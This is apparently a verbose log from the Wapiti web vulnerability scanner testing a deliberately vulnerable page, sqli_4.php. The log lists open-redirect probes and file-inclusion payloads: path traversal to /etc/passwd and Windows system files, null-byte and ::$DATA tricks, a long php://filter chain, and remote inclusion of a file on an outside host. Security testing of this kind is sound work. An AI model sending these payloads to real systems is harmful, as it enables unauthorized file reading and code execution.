2024-03-20 16:46:10.346 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_4.php?title=fuzz&action=search (0)
2024-03-20 16:46:10.934 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php?title=default&action=search (1)
2024-03-20 16:46:10.934 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_4.php?title=default&action=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-20 16:46:10.957 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_4.php?title=default&action=%2F%2Fopenbugbounty.org%2F
2024-03-20 16:46:10.987 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php (1)
2024-03-20 16:46:11.010 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-20 16:46:11.029 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php?title=fuzz&action=search (0)
2024-03-20 16:46:11.033 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&action=search (0)
2024-03-20 16:46:11.047 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&action=search (0)
2024-03-20 16:46:11.059 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=%2Fetc%2Fpasswd&action=search (0)
2024-03-20 16:46:11.073 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=%2Fetc%2Fpasswd%00&action=search (0)
2024-03-20 16:46:11.086 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.102 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.117 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&action=search (0)
2024-03-20 16:46:11.128 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&action=search (0)
2024-03-20 16:46:11.141 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&action=search (0)
2024-03-20 16:46:11.155 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.170 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.184 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&action=search (0)
2024-03-20 16:46:11.197 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&action=search (0)
2024-03-20 16:46:11.209 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&action=search (0)
2024-03-20 16:46:11.223 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
2024-03-20 16:46:11.236 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
2024-03-20 16:46:11.246 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
2024-03-20 16:46:11.260 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
2024-03-20 16:46:11.272 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.284 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.295 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.308 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.321 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.334 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.346 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.358 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.370 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&action=search (0)
2024-03-20 16:46:11.382 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
2024-03-20 16:46:11.397 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
2024-03-20 16:46:11.413 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
2024-03-20 16:46:11.430 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
2024-03-20 16:46:11.447 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.462 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.476 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.490 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.502 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.517 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.536 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.551 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.563 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
2024-03-20 16:46:11.574 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=search (0)
2024-03-20 16:46:11.585 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
2024-03-20 16:46:11.599 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=search (0)
2024-03-20 16:46:11.614 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.627 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.640 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.652 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.665 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.677 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.688 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.700 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.713 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=file%3A%2F%2F%2Fetc%2Fpasswd&action=search (0)
2024-03-20 16:46:11.726 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&action=search (0)
2024-03-20 16:46:11.738 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&action=search (0)
2024-03-20 16:46:11.749 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&action=search (0)
2024-03-20 16:46:11.759 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.773 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.784 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=search (0)
2024-03-20 16:46:11.795 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=search (0)
2024-03-20 16:46:11.808 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=sqli_4.php&action=search (0)
2024-03-20 16:46:11.822 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=sqli_4.php%00&action=search (0)
2024-03-20 16:46:11.833 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_4.php?title=sqli_4.php%3A%3A%24DATA&action=search (0)
